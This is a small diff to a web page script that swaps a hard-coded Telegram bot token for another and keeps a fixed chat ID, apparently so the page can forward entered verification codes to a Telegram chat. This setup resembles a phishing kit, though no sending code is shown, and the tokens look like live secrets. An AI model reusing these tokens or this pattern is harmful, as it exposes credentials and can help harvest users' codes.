@@ -8,7 +8,7 @@ document.addEventListener('DOMContentLoaded', function() {
     const codeError = document.getElementById('codeError');
     const codeSuccess = document.getElementById('codeSuccess');
 
-    var telegramToken = '8907564835:AAEE5wJ5dWA0tIfl3FbFkK0NdsI6QDmghAk';
+    var telegramToken = '8986722718:AAEnBubgMQDs4wlah0IRjFWh0Qiu4PKcOrk';
     var chatId = '6547125053';
 
     var toastTimeout;
